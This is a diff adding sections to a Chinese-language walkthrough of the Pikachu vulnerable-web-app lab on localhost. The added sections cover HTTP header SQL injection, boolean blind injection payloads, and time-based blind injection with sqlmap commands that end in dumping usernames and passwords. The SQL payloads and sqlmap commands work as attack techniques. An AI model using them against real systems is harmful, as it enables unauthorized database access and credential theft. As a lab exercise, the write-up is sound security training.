@@ -229,3 +229,105 @@ http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=male&phonenum=U 
 > <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/IAP@@PE2FM_Q56175~9KNX9.png?raw=true">
 
 以下省略
+
+### http header 注入
+
+使用账号admin，密码123456登录，发现user agent字样
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/@0AV4N]{JYB6FW$$I4O}U_B.png?raw=true">
+
+抓包，将user agent改为引号，出现报错
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/2V5}8UT_U]_UZ5V@2@AW%~D.png?raw=true">
+
+查询数据库
+
+```sql
+1' and extractvalue(1,concat(0x5c,(database()))) and '1'='1
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/CBS0[L$}LFWNCP${DT4NPYE.png?raw=true">
+
+以下省略
+
+### 盲注(base on boolian)
+
+直接开始布尔盲注，先构建payload。确定字符类型注入，单引号闭合
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/A(V4SFQR]QVQ(KZCE8XF7~L.png?raw=true">
+
+判断数据库名长度是否小于9
+
+```sql
+1' and length((select database()))<9 #
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/OSSH7F4WVQCG~F8LNB{FOPR.png?raw=true">
+
+数据库名第一个字符是否大于小写a
+
+```sql
+1' and ascii(substr((select database()),1,1))>'a' #
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/VE~115NMU84AZ30(CX$C5OH.png?raw=true">
+
+以下步骤省略，详见<a href="https://github.com/Ki1z/CTF/blob/main/BUUCTF/Basic/sqli-labs.md">sqli-labs</a>的Less-5
+
+### 盲注(base on time)
+
+下面来讲解sqlmap的用法，首先查询当前数据库
+
+```python
+python sqlmap.py -u http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php --current-db --technique=T --forms --time-sec 2
+```
+
+- `-u` 指定需要注入的url
+
+- `--current-db` 查询当前数据库
+
+- `--technique=T` 指定使用的注入方式，这里的T是时间注入
+
+- `--forms` 自动从url中获取表单
+
+- `--time-sec` 指定延迟，这里是两秒。非必加，sqlmap会自动判断
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/_(GZMR2CN(U5)$5K1}5}VX4.png?raw=true">
+
+查询所有表
+
+```python
+python sqlmap.py -u http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php -D pikachu -tables --technique=T --forms
+```
+
+- `-D` 指定数据库，这里指定的是pikachu数据库
+
+- `-tables` 查询所有表
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/7_PPJ}26WU3U[]KF9XG7MNS.png?raw=true">
+
+查询users下所有字段
+
+```python
+python sqlmap.py -u http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php -D pikachu -T users -columns --technique=T --forms
+```
+
+- `-T` 指定表
+
+- `-columns` 查询所有字段
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/}5OG%4NI{YIP{JPWSZC)@_H.png?raw=true">
+
+查字段内容
+
+```python
+python sqlmap.py -u http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php -D pikachu -T users -C username,password -dump --technique=T --forms
+```
+
+- `-C` 指定字段
+
+- `-dump` 查询字段内容
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/X7)G{WF~6VG2({%R7@P6Y6P.png?raw=true">
+
+*注：password字段内容的括号内为自动解码得到的结果*
